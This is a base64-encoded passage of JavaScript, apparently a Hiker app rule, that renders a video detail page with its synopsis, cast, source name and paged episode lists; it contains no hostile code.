dyA9PSAnMScpIHtcXG4gICAgICAgIHVwZGF0ZUl0ZW0oJ2Rlc2MnLCB7XFxuICAgICAgICAgIHRpdGxlOiB0aXRsZVxcbiAgICAgICAgICAgIC5yZXBsYWNlKHJldCwgZXhwKVxcbiAgICAgICAgICAgIC5yZXBsYWNlKHJlLCAnJDEnICsgc2RjICsgJzwvc21hbGw+JylcXG4gICAgICAgICAgICAucmVwbGFjZSgvKDxcXFxcL3NtYWxsPjxicj5cXFxcPGZvbnQgY29sb3I9XFxcIikuKj8oXFxcIj4pLywgJyQxJyArIGNzLmhpZGUgKyAnJDInKVxcblxcbiAgICAgICAgfSlcXG4gICAgICAgIHN0b3JhZ2UwLnNldEl0ZW0obSwgJzAnKTtcXG4gICAgICB9IGVsc2Uge1xcbiAgICAgICAgdXBkYXRlSXRlbSgnZGVzYycsIHtcXG4gICAgICAgICAgdGl0bGU6IHRpdGxlXFxuICAgICAgICAgICAgLnJlcGxhY2UoZXhwLCByZXQpXFxuICAgICAgICAgICAgLnJlcGxhY2UocmUsICckMScgKyBkYyArICc8L3NtYWxsPicpXFxuICAgICAgICAgICAgLnJlcGxhY2UoLyg8XFxcXC9zbWFsbD48YnI+XFxcXDxmb250IGNvbG9yPVxcXCIpLio/KFxcXCI+KS8sICckMScgKyBjcy5zaG93ICsgJyQyJylcXG4gICAgICAgIH0pXFxuICAgICAgICBzdG9yYWdlMC5zZXRJdGVtKG0sICcxJyk7XFxuICAgICAgfVxcbiAgICAgIHJldHVybiBgaGlrZXI6Ly9lbXB0eWBcXG4gICAgfSwgZGVzYywgc2Rlc2MsIG1hcmssIGNvbG9ycylcXG4gICAgdmFyIHNjID0gc3RvcmFnZTAuZ2V0SXRlbShtYXJrLCAnMCcpID09ICcwJyA/ICflsZXlvIA6JyA6ICfmlLbotbc6JztcXG4gICAgdmFyIGRjID0gc3RvcmFnZTAuZ2V0SXRlbShtYXJrLCAnMCcpID09ICcwJyA/IHNkZXNjIDogZGVzYztcXG4gICAgdmFyIGNzID0gc3RvcmFnZTAuZ2V0SXRlbShtYXJrLCAnMCcpID09ICcwJyA/IGNvbG9ycy5oaWRlIDogY29sb3JzLnNob3c7XFxuICAgIGQucHVzaCh7XFxuICAgICAgdGl0bGU6ICcnICsgJzxiPjxmb250IGNvbG9yPVxcXCIjMDk4QUMxXFxcIj7iiLfliafmg4XnroDku4tcXHQ8L2ZvbnQ+PC9iPicgKyBcXFwiPHNtYWxsPjxhIHN0eWxlPSd0ZXh0LWRlY29yYXRpb246IG5vbmU7JyBocmVmPSdcXFwiICsgbGF6eSArIFxcXCInPlxcXCIgKyBzYyArICc8L2E+PC9zbWFsbD48YnI+PGZvbnQgY29sb3I9XFxcIicgKyBjcyArICdcXFwiPicgKyBgJHtkY31gICsgJzwvc21hbGw+JyxcXG4gICAgICBjb2xfdHlwZTogJ3JpY2hfdGV4dCcsXFxuICAgICAgZXh0cmE6IHtcXG4gICAgICAgIGlkOiAnZGVzYycsXFxuICAgICAgICBsaW5lU3BhY2luZzogNixcXG4gICAgICAgIHRleHRTaXplOiAxNSxcXG4gICAgICAgIGxpbmVWaXNpYmxlOiB0cnVlLFxcbiAgICAgIH1cXG4gICAgfSlcXG4gIH1cXG5cXG4gIE9iamVjdC5kZWZpbmVQcm9wZXJ0eShTdHJpbmcucHJvdG90eXBlLCAnU3BsaXQnLCB7XFxuICAgIHZhbHVlOiBmdW5jdGlvbiAocywgZSkge1xcbiAgICAgIGlmIChlKSB7XFxuICAgICAgICByZXR1cm4gdGhpcy5zcGxpdChzKS5maWx0ZXIoaXRlbSA9PiBpdGVtICE9PSAnJyk7XFxuICAgICAgfSBlbHNlIHtcXG4gICAgICAgIHJldHVybiB0aGlzLnNwbGl0KHMpO1xcbiAgICAgIH1cXG4gICAgfSxcXG4gICAgZW51bWVyYWJsZTogZmFsc2UsXFxuICB9KTtcXG5cXG5cXG4gIGxldCBzb3J0b2JqID0gW1xcbiAgICBmb250c3R5bGUoXFxcIuato+W6j1xcXCIsIHtcXG4gICAgICBjOiBcXFwiIzFBQUQxOVxcXCIsXFxuICAgICAgdGFnczogXFxcImJcXFwiXFxuICAgIH0pLFxcbiAgICBmb250c3R5bGUoXFxcIumAhuW6j1xcXCIsIHtcXG4gICAgICBjOiBcXFwiI0ZGMDAwMFxcXCIsXFxuICAgICAgdGFnczogXFxcImJcXFwiXFxuICAgIH0pXFxuICBdXFxuICAvL+aWueazlVxcblxcbiAgdmFyIHNvcnRpID0gZ2V0TXlWYXIoXFxcInNvcnRpXFxcIiwgXFxcIjBcXFwiKTtcXG5cXG4gIC8vbG9nKHNvcnRvYmopXFxuICAkLmV4dGVuZCh7XFxuICAgIHNwbGl0UGFnZSh0b3RhbEl0ZW1zLCBwYWdlU2l6ZSkge1xcbiAgICAgIHBhZ2VTaXplID0gcGFnZVNpemUgfHwgNTA7XFxuICAgICAgbGV0IHJlc3VsdCA9IFtdO1xcbiAgICAgIGZvciAobGV0IGkgPSAxOyBpIDw9IHRvdGFsSXRlbXM7IGkgKz0gcGFnZVNpemUpIHtcXG4gICAgICAgIGxldCBlbmQgPSBpICsgcGFnZVNpemUgLSAxO1xcbiAgICAgICAgaWYgKGVuZCA+IHRvdGFsSXRlbXMpIHtcXG4gICAgICAgICAgZW5kID0gdG90YWxJdGVtcztcXG4gICAgICAgIH1cXG4gICAgICAgIHJlc3VsdC5wdXNoKGAke2l9LSR7ZW5kfWApO1xcbiAgICAgIH1cXG4gICAgICByZXR1cm4gcmVzdWx0O1xcbiAgICB9LFxcbiAgICBzcGxpdEFycmF5QnlSYW5nZXMoYXJyYXksIHJhbmdlcykge1xcbiAgICAgIC8vIOagueaNruiMg+WbtOaLhuWIhuaVsOe7hFxcbiAgICAgIHZhciByZXN1bHQgPSByYW5nZXMubWFwKGZ1bmN0aW9uIChyYW5nZSkge1xcbiAgICAgICAgdmFyIHBhcnRzID0gcmFuZ2Uuc3BsaXQoJy0nKS5tYXAoTnVtYmVyKTtcXG4gICAgICAgIHZhciBzdGFydCA9IHBhcnRzWzBdIC0gMTsgLy8g5YePMeaYr+WboOS4uuaVsOe7hOe0ouW8leS7jjDlvIDlp4tcXG4gICAgICAgIHZhciBlbmQgPSBwYXJ0c1sxXSAtIDE7XFxuICAgICAgICAvLyDkvb/nlKhBcnJheS5wcm90b3R5cGUuc2xpY2XmnaXojrflj5blrZDmlbDnu4RcXG4gICAgICAgIHJldHVybiBhcnJheS5zbGljZShzdGFydCwgZW5kICsgMSk7IC8vIOWMheaLrOe7k+adn+e0ouW8le+8jOaJgOS7peWKoDFcXG4gICAgICB9KTtcXG4gICAgICByZXR1cm4gcmVzdWx0O1xcbiAgICB9LFxcbiAgfSlcXG5cXG4gIGxldCBzb3VyY2UgPSB7fTtcXG4gIGlmKE1ZX1BBUkFNUy5zb3VyY2Upe1xcbiAgICAgIHNvdXJjZT1NWV9QQVJBTVMuc291cmNlO1xcbiAgfWVsc2V7XFxuICAgICAgY29uc3QgcnVudGltZUNvbmZpZyA9IEdNLmRlZmluZU1vZHVsZShcXFwicnVudGltZUNvbmZpZ1xcXCIpO1xcbiAgICAgIHNvdXJjZT1ydW50aW1lQ29uZmlnLmZpbmRTb3VyY2UoTVlfUEFSQU1TLnNrZXkpO1xcbiAgICAgIE1ZX1BBUkFNUy5zb3VyY2U9c291cmNlO1xcbiAgICAgIHNldFBhZ2VQYXJhbXMoTVlfUEFSQU1TKTtcXG4gIH1cXG4gIFxcbiAgY29uc3QgRHJweU1hbmFnZSA9IEdNLmRlZmluZU1vZHVsZShcXFwiRHJweU1hbmFnZVxcXCIpO1xcbiAgXFxuICBEcnB5TWFuYWdlLmluaXRQYWdlKFxcXCJlclxcXCIpO1xcbiAgbG9nKHNvdXJjZSk7XFxuICBsZXQgZHJweSA9IERycHlNYW5hZ2UuZ2V0QnlTb3VyY2Uoc291cmNlKTtcXG5cXG4gIGxldCBpbmZvID0gc3RvcmFnZTAuZ2V0TXlWYXIoaWQgKyBcXFwiZXJpbmZvXFxcIiwgXFxcIlxcXCIpO1xcblxcbiAgaWYgKGluZm8gPT0gXFxcIlxcXCIpIHtcXG4gICAgaW5mbyA9IEpTT04ucGFyc2UoZHJweS5kZXRhaWwoU3RyaW5nKGlkKSkpLmxpc3RbMF07XFxuICAgIHN0b3JhZ2UwLnB1dE15VmFyKGlkICsgXFxcImVyaW5mb1xcXCIsIGluZm8pXFxuICB9XFxuXFxuICBsZXQgW+WvvOa8lCwg5Li75ryUXSA9IFtpbmZvLnZvZF9kaXJlY3RvciwgaW5mby52b2RfYWN0b3JdXFxuICBpZiAo5a+85ryUICE9IHVuZGVmaW5lZCkge1xcbiAgICDlr7zmvJQgPSDlr7zmvJQuU3BsaXQoL1xcXFwvL2csIHRydWUpLmpvaW4oXFxcIiBcXFwiKTtcXG4gICAg5a+85ryUID0gL1s677yaXS8udGVzdCjlr7zmvJQpID8g5a+85ryUIDogXFxcIuWvvOa8lDpcXFwiICsg5a+85ryUXFxuICB9XFxuICBpZiAo5Li75ryUICE9IHVuZGVmaW5lZCkge1xcbiAgICDkuLvmvJQgPSDkuLvmvJQuU3BsaXQoL1xcXFwvL2csIHRydWUpLmpvaW4oXFxcIiBcXFwiKTtcXG4gICAg5Li75ryUID0gL1s677yaXS8udGVzdCjkuLvmvJQpID8g5Li75ryUIDogXFxcIuS4u+a8lDpcXFwiICsg5Li75ryUXFxuICB9XFxuICBsZXQgW+WQjeensCwg5aSH5rOoXSA9IFtpbmZvLnZvZF9uYW1lLCBpbmZvLnZvZF9yZW1hcmtzXVxcbiAgaWYgKOWkh+azqCAhPSB1bmRlZmluZWQpIHtcXG4gICAg5aSH5rOoID0g5aSH5rOoLlNwbGl0KC9cXFxcLy9nLCB0cnVlKS5qb2luKFxcXCIgXFxcIik7XFxuICAgIOWkh+azqCA9IC9bOu+8ml0vLnRlc3Qo5aSH5rOoKSA/IOWkh+azqCA6IFxcXCLlpIfms6g6XFxcIiArIOWkh+azqDtcXG4gIH1cXG4gIGxldCB0aXRsZXMgPSBb5ZCN56ewLCDlpIfms6hdO1xcbiAgbGV0IGRlc2NzID0gW+WvvOa8lCwg5Li75ryUXVxcblxcbiAgbGV0IGQgPSBbXTtcXG4gIGQucHVzaCh7XFxuICAgIHRpdGxlOiB0aXRsZXMuZmlsdGVyKGUgPT4gZSkuam9pbihcXFwiXFxcXG5cXFwiKSxcXG4gICAgZGVzYzogZGVzY3MuZmlsdGVyKGUgPT4gZSkuam9pbihcXFwiXFxcXG5cXFwiKSxcXG4gICAgcGljX3VybDogaW5mby52b2RfcGljIHx8IE1ZX1BBUkFNUy5pbWcsXFxuICAgIGV4dHJhOiB7XFxuICAgICAgZ3JhZGllbnQ6IGZhbHNlLFxcbiAgICB9XFxuICB9KTtcXG4gIGQucHVzaCh7XFxuICAgIHRpdGxlOiAn5pWw5o2u5p2l5rqQOicgKyBNWV9QQVJBTVMuc25hbWUsXFxuICAgIC8vZGVzYzpcXFwiXFxcIitNWV9QQVJBTVMuc2tleStcXFwiXFxcXHRcXFwiLFxcbiAgICBpbWc6IFxcXCJodHRwczovL2hpa2VyZmFucy5jb20vdHViaWFvL21lc3N5Lzc4LnN2Z1xcXCIsXFxuICAgIHVybDogXFxcImhpa2VyOi8vZW1wdHlcXFwiLFxcbiAgICBjb2xfdHlwZTogXFxcImF2YXRhclxcXCJcXG4gIH0pXFxuICBzZXREZXNjKGluZm8udm9kX2NvbnRlbnQpXFxuXFxuICAvKlxcbiAgZnVuY3Rpb24gcGFyc2VRdWVyeShxdWVyeSkge1xcbiAgICB2YXIgb2JqID0ge307XFxuICAgIHF1ZXJ5LnNwbGl0KFxcXCImXFxcIikuZmlsdGVyKGUgPT4gZSkuZm9yRWFjaChmdW5jdGlvbiAoaXRlbSkge1xcbiAgICAgIHZhciBwYXJ0cyA9IGl0ZW0uc3BsaXQoXFxcIj1cXFwiKTtcXG4gICAgICBvYmpbcGFydHNbMF1dID0gcGFydHNbMV07XFxuICAgIH0pO1xcbiAgICByZXR1cm4gb2JqO1xcbiAgfVxcblxcbiAgLy9qc+aJp+ihjFxcbiAgbGV0IHBhcnNlX29iaiA9IHtcXG4gICAgZGVmUnVsZXM6IFtcXFwiKi5tcDRcXFwiLCBcXFwiKi5tM3U4XFxcIl0sXFxuICB9O1xcbiAgdmFyIGV4dHJhID0ge1xcbiAgICBcXFwidWFcXFwiOiBNT0JJTEVfVUFcXG4gIH1cXG4gIGxldCBwYXJzZSA9IEpTT04ucGFyc2UoZHJweS5wbGF5KCkpO1xcbiAgLy9jb25zb2xlLmxvZyhwYXJzZSk7XFxuICBpZiAocGFyc2UuaGFzT3duUHJvcGVydHkoXFxcInBhcnNlX2V4dHJhXFxcIikpIHtcXG4gICAgbGV0IHBhcnNlX2V4dHJhID0gZGVjb2RlVVJJQ29tcG9uZW50KHBhcnNlLnBhcnNlX2V4dHJhKTtcXG4gICAgcGFyc2Vfb2JqID0gT2JqZWN0LmFzc2lnbihwYXJzZV9vYmosIHBhcnNlUXVlcnkocGFyc2VfZXh0cmEpKTtcXG4gICAgaWYgKHBhcnNlX29iai5oYXNPd25Qcm9wZXJ0eShcXFwiaW5pdF9zY3JpcHRcXFwiKSkge1xcbiAgICAgIHBhcnNlX29ialtcXFwiaW5pdF9zY3JpcHRcXFwiXSA9IGJhc2U2NERlY29kZShwYXJzZV9vYmpbXFxcImluaXRfc2NyaXB0XFxcIl0pO1xcbiAgICB9XFxuICB9XFxuICBpZiAocGFyc2Vfb2JqLmhhc093blByb3BlcnR5KFxcXCJpc19wY1xcXCIpICYmIHBhcnNlX29ialtcXFwiaXNfcGNcXFwiXSA9PSBcXFwiMVxcXCIpIHtcXG4gICAgZXh0cmFbXFxcInVhXFxcIl0gPSBQQ19VQTtcXG4gIH1cXG4gIGlmIChwYXJzZS5oYXNPd25Qcm9wZXJ0eShcXFwiaGVhZGVyXFxcIikpIHtcXG4gICAgZXh0cmFbXFxcInVhXFxcIl0gPSBwYXJzZVtcXFwiaGVhZGVyXFxcIl1bXFxcIlVzZXItQWdlbnRcXFwiXTtcXG4gICAgLy9leHRyYVtcXFwicmVkaXJlY3RcXFwiXT1mYWxzZTtcXG4gICAgZXh0cmFbXFxcImpzXFxcIl0gPSAkLnRvU3RyaW5nKChqcykgPT4ge1xcbiAgICAgIGV2YWwoanMpXFxuICAgICAgZmJhLmxvZyhuYXZpZ2F0b3IudXNlckFnZW50KVxcbiAgICAgIGZiYS5sb2cobG9jYXRpb24uaHJlZilcXG4gICAgfSwgJC50b1N0cmluZygoKSA9PiB7XFxuICAgICAgT2JqZWN0LmRlZmluZVByb3BlcnR5KG5hdmlnYXRvciwgJ3VzZXJBZ2VudCcsIHtcXG4gICAgICAgIGdldDogZnVuY3Rpb24gKCkge1xcbiAgICAgICAgICByZXR1cm4gJ015LUN1c3RvbS1VQS1TdHJpbmcnO1xcbiAgICAgICAgfVxcbiAgICAgIH0pO1xcbiAgICB9KSlcXG4gIH1cXG4gIGlmIChwYXJzZV9vYmouaGFzT3duUHJvcGVydHkoXFxcImN1c3RvbV9yZWdleFxcXCIpKSB7XFxuICAgIGxldCBjdXJyZW50ID0gcGFyc2Vfb2JqW1xcXCJkZWZSdWxlc1xcXCJdO1xcbiAgICBleHRyYVtcXFwidmlkZW9SdWxlc1xcXCJdID0gY3VycmVudC5jb25jYXQocGFyc2Vfb2JqLmN1c3RvbV9yZWdleC5zcGxpdCgvXFxcXHwvZykuZmlsdGVyKGUgPT4gZSkpXFxuICB9XFxuICBpZiAocGFyc2UuaGFzT3duUHJvcGVydHkoXFxcImpzXFxcIikpIHtcXG4gICAgZXh0cmFbXFxcImpzXFxcIl0gPSAkLnRvU3RyaW5nKChqcywgcGFyc2UsIHQpID0+IHtcXG4gICAgICBpZiAocGFyc2UuaGFzT3duUHJvcGVydHkoXFxcImluaXRfc2NyaXB0XFxcIikpIHtcXG4gICAgICAgIGZiYS5sb2codCArIFxcXCI65omn6KGMaW5pdF9zY3JpcHRcXFwiKTtcXG4gICAgICAgIGV2YWwocGFyc2UuaW5pdF9zY3JpcHQpO1xcbiAgICAgIH1cXG4gICAgICBmYmEubG9nKG5hdmlnYXRvci5wbGF0Zm9ybSk7XFxuICAgICAgZmJhLmxvZyh0ICsgXFxcIjrmiafooYxqc+eCueWHu1xcXCIpXFxuICAgICAgZXZhbChqcylcXG4gICAgfSwgcGFyc2UuanMsIHBhcnNlX29iaiwgTVlfUlVMRS50aXRsZSlcXG4gIH1cXG4gIC8vbG9nKGV4dHJhKVxcbiAgKi9cXG4gIGxldCBmcm9tID0gW107XFxuICBpZiAoaW5mby52b2RfcGxheV9mcm9tICE9IHVuZGVmaW5lZCkge1xcbiAgICBmcm9tID0gaW5mby52b2RfcGxheV9mcm9tLnNwbGl0KFxcXCIkJCRcXFwiKTtcXG4gICAgLypsZXQgcGxheUxhenkgPSAkKFxcXCJcXFwiKS5sYXp5UnVsZSgoKSA9PiB7XFxuICAgICAgZnVuY3Rpb24gaXNvZmZpY2lhbCh1cmwpIHtcXG4gICAgICAgIGxldCBmbGFnID0gbmV3IFJlZ0V4cCgncXFcXFxcLmNvbXxpcWl5aVxcXFwuY29tfHlvdWt1XFxcXC5jb218bWd0dlxcXFwuY29tfGJpbGliaWxpXFxcXC5jb218c29odVxcXFwuY29tfGl4aWd1YVxcXFwuY29tfHBwdHZcXFxcLmNvbXxtaWd1dmlkZW9cXFxcLmNvbXxsZVxcXFwuY29tfDE5MDVcXFxcLmNvbXxmdW5cXFxcLnR2Jyk7XFxuICAgICAgICByZXR1cm4gZmxhZy50ZXN0KHVybCk7XFxuICAgICAgfVxcblxcbiAgICAgIGxldCBkcnB5ID0gR00uZGVmaW5lTW9kdWxlKFxcXCJkcnB5XFxcIiwgXFxcImRycHlcXFwiKTtcXG4gICAgICBpbnB1dCA9IGlucHV0LnNwbGl0KFxcXCIjXFxcIik7XFxuICAgICAgbGV0IHBsYXkgPSBKU09OLnBhcnNlKGRycHkucGxheShpbnB1dFsxXSwgaW5wdXRbMF0ucmVwbGFjZShcXFwidHZib3gteGc6XFxcIiwgXFxcIlxcXCIpLCBbXSkpO1xcbiAgICAgIGxvZyhwbGF5KVxcbiAgICAgIGxvZyhcXFwicGxheS51cmxcXFwiKVxcbiAgICAgIGxldCBwYXJzZV9vYmogPSB7XFxuICAgICAgICBkZWZfcmVnZXg6IFN0cmluZy5yYXdgXFxcXC4obXA0fG0zdTgpfGNuL3Rvc2AsXFxuICAgICAgfTtcXG5cXG4gICAgICBpZiAocGxheS51cmwuaW5jbHVkZXMoXFxcInByb3h5P2RvXFxcIikpIHtcXG4gICAgICAgIE1ZX1VSTCA9IHBsYXkudXJsO1xcbiAgICAgICAgcGxheS51cmwgPSBkZWNvZGVVUklDb21wb25lbnQoZ2V0UGFyYW0oXFxcInVybFxcXCIsIFxcXCJcXFwiKSk7XFxuICAgICAgfVxcbiAgICAgIGlmIChwbGF5LnVybC5zdGFydHNXaXRoKFxcXCJodHRwczovL3Bhbi5xdWFyay5jbi9cXFwiKSkge1xcbiAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL3NlYXJjaD9zPVxcXCIgKyBwbGF5LnVybCArIFxcXCImcnVsZT11Y2tr5LqRXFxcIlxcbiAgICAgIH1cXG4gICAgICBpZiAocGxheS51cmwuc3RhcnRzV2l0aCgnaHR0cHM6Ly93d3cuYWxpeXVuZHJpdmUuY29tL3MvJykgfHwgcGxheS51cmwuc3RhcnRzV2l0aChcXFwiaHR0cHM6Ly93d3cuYWxpcGFuLmNvbS9zL1xcXCIpKSB7XFxuICAgICAgICByZXR1cm4gXFxcImhpa2VyOi8vcGFnZS9hbGl5dW4/cnVsZT3kupHnm5jlkJsu566AJnBhZ2U9ZnlwYWdlJnJlYWx1cmw9XFxcIiArIGVuY29kZVVSSUNvbXBvbmVudChwbGF5LnVybCk7XFxuICAgICAgfVxcbiAgICAgIGlmIChwbGF5LnBhcnNlID09PSAxKSB7XFxuICAgICAgICBpZiAocGxheS51cmwuc3RhcnRzV2l0aChcXFwibWFnbmV0OlxcXCIpKSB7XFxuICAgICAgICAgIHJldHVybiBwbGF5LnVybDtcXG4gICAgICAgIH1cXG4gICAgICAgIGlmIChpc29mZmljaWFsKHBsYXkudXJsKSkge1xcbiAgICAgICAgICByZXR1cm4gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvbXVsUGFyc2U/cnVsZT3phY3nva7liqnmiYtcXFwiKS5tdWxQYXJzZShwbGF5LnVybCk7XFxuICAgICAgICB9XFxuICAgICAgICByZXR1cm4gXFxcInZpZGVvOi8vXFxcIiArIHBsYXkudXJsO1xcbiAgICAgIH0gZWxzZSBpZiAocGxheS5wYXJzZSA9PT0gMCkge1xcbiAgICAgICAgcmV0dXJuIHBsYXkudXJsO1xcbiAgICAgIH1cXG4gICAgfSk7Ki9cXG4gIH1cXG5cXG4gIGxldCBwbGF5TGF6eSA9ICQoXFxcIlxcXCIpLmxhenlSdWxlKChpZCwgc291cmNlKSA9PiB7XFxuICAgIHJldHVybiAkLnJlcXVpcmUoXFxcInZpZGVvVXJsXFxcIikucGFyc2UoaW5wdXQsIGlkLCBzb3VyY2UpO1xcbiAgfSwgXFxcImlkXFxcIiwgc291cmNlKTtcXG5cXG4gIGxldCBwbGF5VXJsTGlzdCA9IFtdO1xcbiAgLy9jb25zb2xlLmxvZyhpbmZvLnZvZF9wbGF5X3VybCk7XFxuICBsZXQgcGxheXBhZ2VzID0gW107XFxuICBpZiAoaW5mby52b2RfcGxheV91cmwgJiYgaW5mby52b2RfcGxheV91cmwgIT0gXFxcIlxcXCIpIHtcXG4gICAgbGV0IGNvbCA9IFxcXCJ0ZXh0XzRcXFwiO1xcbiAgICBsZXQgdGV4dGFsaWduID0gXFxcIlxcXCI7XFxuICAgIHBsYXlVcmxMaXN0ID0gaW5mby52b2RfcGxheV91cmwuc3BsaXQoXFxcIiQkJFxcXCIpLm1hcCgodCwgaSkgPT4ge1xcbiAgICAgIGxldCBpbWcgPSBcXFwiXFxcIjtcXG4gICAgICBsZXQgdHMgPSB0LnNwbGl0KFxcXCIjXFxcIikubWFwKChrKSA9PiBrLnNwbGl0KFxcXCIkXFxcIilbMF0pO1xcbiAgICAgIGxldCBwYWdlcyA9ICQuc3BsaXRQYWdlKHRzLmxlbmd0aClcXG4gICAgICBsZXQgdGMgPSBjb3VudFRvdGFsQnl0ZXMoZmluZExvbmdlc3RFbGVtZW50KHRzKSk7XFxuICAgICAgaWYgKHRzLmZpbHRlcihlID0+IGUgIT0gXFxcIlxcXCIpLmxlbmd0aCkge1xcbiAgICAgICAgcGxheXBhZ2VzW2ldID0gcGFnZXM7XFxuICAgICAgfVxcbiAgICAgIGlmICh0YyA+IDI0KSB7XFxuICAgICAgICBjb2wgPSBcXFwidGV4dF8xXFxcIjtcXG4gICAgICAgIGltZyA9IFxcXCJodHRwczovL2hpa2VyZmFucy5jb20vdHViaWFvL21vdmllLzE0Ni5zdmdcXFwiO1xcbiAgICAgIH0gZWxzZSBpZiAodGMgPj0gMTIgJiYgdGMgPCAxNSkge1xcbiAgICAgICAgY29sID0gXFxcInRleHRfM1xcXCI7XFxuICAgICAgfSBlbHNlIGlmICh0YyA+PSAxNSkge1xcbiAgICAgICAgY29sID0gXFxcInRleHRfMlxcXCI7XFxuICAgICAgICB0ZXh0YWxpZ24gPSBcXFwibGVmdFxcXCI7XFxuICAgICAgfVxcbiAgICAgIGxldCBwbGF5b2JqID0gdC5zcGxpdChcXFwiI1xcXCIpLm1hcCgoaikgPT4ge1xcbiAgICAgICAgbGV0IGsgPSBqLnNwbGl0KFxcXCIkXFxcIik7XFxuICAgICAgICBsZXQgdCA9IGtbMF07XFxuICAgICAgICBsZXQgdWlkID0gKGtbMV18fGtbMF0pO1xcbiAgICAgICAgcmV0dXJuIHtcXG4gICAgICAgICAgdGl0bGU6IGZvbnRzdHlsZSh0LCB7XFxuICAgICAgICAgICAgdGFnczogXFxcInNtYWxsXFxcIlxcbiAgICAgICAgICB9KSxcXG4gICAgICAgICAgdXJsOiAgdWlkKyBcXFwiI1xcXCIgKyBmcm9tW2ldICsgcGxheUxhenkucmVwbGFjZSgnXFxcImlkXFxcIicsICdcXFwiJyArdWlkICsgJ1xcXCInKSxcXG4gICAgICAgICAgY29sX3R5cGU6IGNvbCxcXG4gICAgICAgICAgaW1nOiBpbWcsXFxuICAgICAgICAgIC8qZXh0cmE6IE9iamVjdC5hc3NpZ24oe30sIGV4dHJhLCB7XFxuICAgICAgICAgICAgXFxcIlJlZmVyZXJcXFwiOiBkZWNvZGVVUklDb21wb25lbnQoa1sxXSksXFxuICAgICAgICAgICAgaWQ6IGtbMV0sXFxuICAgICAgICAgICAgLy9saW5lVmlzaWJsZTogZmFsc2UsXFxuICAgICAgICAgICAgdGV4dEFsaWduOiB0ZXh0YWxpZ24sXFxuICAgICAgICAgICAgY2xzOiBcXFwicGxheWxpc3RcXFwiLFxcbiAgICAgICAgICB9KSovXFxuICAgICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgaWQ6IHVpZCxcXG4gICAgICAgICAgICBibG9ja1J1bGVzOiBbJ2JiLioucG5nJywgJy5qcGcnLCBcXFwiaG1cXFxcLmJhaWR1XFxcXC5jb21cXFxcL2htLmpzXFxcIl0sXFxuICAgICAgICAgICAgdmlkZW9FeGNsdWRlUnVsZXM6IFsnP3VybD0nXSxcXG4gICAgICAgICAgICBsaW5lVmlzaWJsZTogZmFsc2UsXFxuICAgICAgICAgICAgdGV4dEFsaWduOiB0ZXh0YWxpZ24sXFxuICAgICAgICAgICAgY2xzOiBcXFwicGxheWxpc3RcXFwiLFxcbiAgICAgICAgICB9XFxuICAgICAgICB9O1xcbiAgICAgIH0pO1xcbiAgICAgIHBsYXlvYmogPSAkLnNwbGl0QXJyYXlCeVJhbmdlcyhwbGF5b2JqLCBwYWdlcyk7XFxuICAgICAgcmV0dXJuIHBsYXlvYmo7XFxuICAgIH0pO1xcbiAgfSBlbHNlIHtcXG4gICAgZC5wdXNoKHtcXG4gICAgICBjb2xfdHlwZTogXFxcImxpbmVcXFwiXFxuICAgIH0sIHtcXG4gICAgICB0aXRsZTogXFxcIuaaguaXoOaSreaUvua6kOaIluaSreaUvuWIl+ihqOWumuS9jemUmeivr1xcXCIsXFxuICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0X2NlbnRlcl8xXFxcIixcXG4gICAgICB1cmw6IE1ZX1BBUkFNUy52b2RJZCxcXG4gICAgfSk7XFxuICAgIHNldFJlc3VsdChkKTtcXG4gIH1cXG5cXG5cXG4gIGxldCBjdXJyZW50TG9jYXRpb24gPSAwO1xcblxcbiAgZnVuY3Rpb24gcmVub3ZhdGVMaXN0KGxvY2F0aW9uKSB7XFxuICAgIC8vZGVsZXRlSXRlbUJ5Q2xzKFxcXCJwbGF5cGFnZVxcXCIpO1xcbiAgICBkZWxldGVJdGVtQnlDbHMoXFxcInBsYXlsaXN0XFxcIik7XFxuICAgIGlmIChwbGF5VXJsTGlzdC5sZW5ndGggPT0gMCkge1xcbiAgICAgIHJldHVybjtcXG4gICAgfVxcbiAgICBsZXQgcGFnZW51bSA9IGdldE15VmFyKFxcXCJwYWdlbnVtXFxcIiwgXFxcIjBcXFwiKTtcXG4gICAgbGV0IHBjb3VudCA9IHBsYXlVcmxMaXN0W2xvY2F0aW9uXS5sZW5ndGg7XFxuICAgIGxldCBsaXN0ID0gcGxheVVybExpc3RbbG9jYXRpb25dW3BhZ2VudW1dO1xcbiAgICBpZiAoIWxpc3QpIHtcXG4gICAgICBmb3IgKGxldCBpID0gcGFnZW51bTsgaSA+PSAwOyBpLS0pIHtcXG4gICAgICAgIGxpc3QgPSBwbGF5VXJsTGlzdFtsb2NhdGlvbl1baV07XFxuICAgICAgICBpZiAobGlzdCkge1xcbiAgICAgICAgICBwYWdlbnVtID0gaTtcXG4gICAgICAgICAgYnJlYWs7XFxuICAgICAgICB9XFxuICAgICAgfVxcbiAgICB9XFxuICAgIGlmIChnZXRNeVZhcihcXFwic29ydGlcXFwiLCBcXFwiMFxcXCIpID09IDEpIHtcXG4gICAgICBsaXN0LnJldmVyc2UoKTtcXG4gICAgfVxcbiAgICAkLmV4dGVuZCh7XFxuICAgICAgdGVtcF9saXN0OiBwbGF5VXJsTGlzdFtsb2NhdGlvbl0sXFxuICAgIH0pXFxuICAgIGxldCBwbGF5cCA9IHBsYXlwYWdlc1tsb2NhdGlvbl07XFxuXFxuICAgIGlmIChwbGF5cCAmJiBwbGF5cC5sZW5ndGggPiAxKSB7XFxuICAgICAgbGV0IHRlbXAgPSB7XFxuICAgICAgICBjb2xfdHlwZTogJ3RleHRfMScsXFxuICAgICAgICBleHRyYToge1xcbiAgICAgICAgICBjbHM6IFxcXCJwbGF5cGFnZVxcXCJcXG4gICAgICAgIH1cXG4gICAgICB9XFxuICAgICAgbGV0IHBhZ2VhcnIgPSBwbGF5cC5tYXAoKHgsIGkpID0+IGkgPT0gcGFnZW51bSA/ICfigJzigJzigJ3igJ0nICsgeC5mb250Y29sb3IoXFxcInJlZFxcXCIpIDogeCk7XFxuICAgICAgZGVsZXRlSXRlbUJ5Q2xzKFxcXCJwbGF5cGFnZVxcXCIpXFxuICAgICAgYWRkSXRlbUFmdGVyKFxcXCJwbGF5cGFnZWxpbmVcXFwiLCBbe1xcbiAgICAgICAgdGl0bGU6ICfkuIrkuIDpobUnLFxcbiAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzRcXFwiLFxcbiAgICAgICAgdXJsOiAkKFxcXCIjbm9Mb2FkaW5nI1xcXCIpLmxhenlSdWxlKChsb2NhdGlvbiwgcG